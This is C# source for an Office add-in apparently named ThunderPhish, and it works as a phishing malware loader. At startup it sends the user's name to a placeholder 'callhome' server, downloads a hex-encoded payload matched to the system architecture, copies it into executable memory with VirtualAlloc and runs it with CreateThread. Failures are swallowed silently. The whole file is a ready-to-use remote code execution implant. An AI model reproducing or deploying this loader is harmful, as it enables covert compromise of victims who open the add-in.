using System;
using System.Net;
using System.Runtime.InteropServices;

namespace ThunderPhish
{
    public partial class ThisAddIn
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, IntPtr flAllocationType, IntPtr flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref IntPtr lpThreadId);

        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            
            try
            {
                WebClient wc = new WebClient();
                //add webpage status check
                string updateString = wc.DownloadString("http://**callhome**/api/updates.php?clientupdate=yes&user=" + Environment.UserName);
                string binaryLoad = null;
                if (updateString.Contains("2.0.2"))
                {
                    if (IntPtr.Size == 4)
                    {
                        binaryLoad = wc.DownloadString("http://**callhome**/api/updatefile.php?clientupdate=yes&arch=x86&user=" + Environment.UserName);
                    }
                    else if (IntPtr.Size == 8)
                    {
                        binaryLoad = wc.DownloadString("http://**callhome**/api/updatefile.php?clientupdate=yes&arch=x64&user=" + Environment.UserName);
                    }
                    else
                    {
                        binaryLoad = wc.DownloadString("http://**callhome**/api/updatefile.php?error=true");
                        return;
                    }
                    //add webpage status check

                    string[] updateBinary = binaryLoad.Split('|');
                    string stringStep = updateBinary[1].Replace(" ", String.Empty);
                    byte[] binaryPatch = ToByteArray(stringStep);

                    try
                    {
                        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(binaryPatch.Length + 1), (IntPtr)0x1000, (IntPtr)0x40);
                        Marshal.Copy(binaryPatch, 0, funcAddr, binaryPatch.Length);
                        
                        IntPtr hThread = IntPtr.Zero;
                        IntPtr threadId = IntPtr.Zero;
                        IntPtr pinfo = IntPtr.Zero;
                        
                        hThread = CreateThread(IntPtr.Zero, (uint)binaryPatch.Length, funcAddr, pinfo, 0, ref threadId);
                        
                        //WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                    catch
                    {
                        //string log = "Something went wrong";
                        //System.IO.File.WriteAllText(@"C:\log.txt", log);
                    }
                }
            }
            catch
            {

            }
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {

        }

        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }


        public static byte[] ToByteArray(String HexString)
        {
            int NumberChars = HexString.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
            }
            return bytes;
        }
    }
    #endregion
}
